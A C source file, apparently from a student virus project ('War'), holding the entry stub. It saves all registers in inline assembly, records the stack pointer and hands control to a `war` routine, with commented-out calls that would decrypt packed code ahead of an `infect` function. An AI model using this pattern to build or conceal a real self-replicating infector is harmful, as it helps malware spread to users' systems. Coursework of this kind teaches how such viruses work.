/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cypher_beg.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/26 14:07:42 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

int		main(void)
{
	t_data data = {0};
	cypher_beg(&data);
}

void	start(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};

	__asm__ __volatile__ (
		"mov	%0, rsp"
		: "=r"(data.rsp)
		);
	cypher_beg(&data);
}

void	cypher_beg(t_data *data)
{

	// DECRYPT TEXT PACKER

	data->context = true;
	char de[] = "beg\n";
	_write(1, de, 4);

//	update_one(&data.key, (char*)cypher_beg, (size_t)war - (size_t)cypher_beg);
//	printf("beg key = %lx\n", data.key.one);
//	revert_one(&data.key, (char*)war, (size_t)infect - (size_t)war);
	war(data);

}
